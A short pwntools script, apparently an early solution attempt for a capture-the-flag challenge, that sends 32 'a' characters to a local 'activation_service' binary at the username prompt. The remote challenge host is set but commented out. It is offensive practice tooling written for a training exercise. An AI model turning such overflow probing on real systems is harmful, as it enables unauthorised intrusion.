#!/usr/bin/env python3

from pwn import *

HOST = 'challs.studsec.nl'
PORT = 3200
# con = remote(HOST, PORT)
con = process('./activation_service')

print(con.recvuntil('Username').decode('utf-8'))
con.sendline('a' * 32)

con.recvall()
